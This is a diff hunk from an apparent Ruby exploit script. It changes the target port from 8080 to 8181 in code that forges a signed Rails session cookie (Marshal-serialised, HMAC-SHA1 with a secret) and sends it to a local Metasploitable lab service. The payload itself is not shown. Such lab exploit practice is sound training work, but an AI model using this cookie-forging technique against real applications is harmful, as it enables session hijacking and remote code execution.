@@ -27,7 +27,7 @@ dump = [ Marshal.dump(session) ].pack('m')
 hmac = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, SECRET, dump)
 cookie = "_metasploitable=#{CGI.escape("#{dump}--#{hmac}")}"
 
-http = Net::HTTP.new('127.0.0.1', 8080)
+http = Net::HTTP.new('127.0.0.1', 8181)
 req = Net::HTTP::Get.new('/')
 req['Cookie'] = cookie
 res = http.request(req)
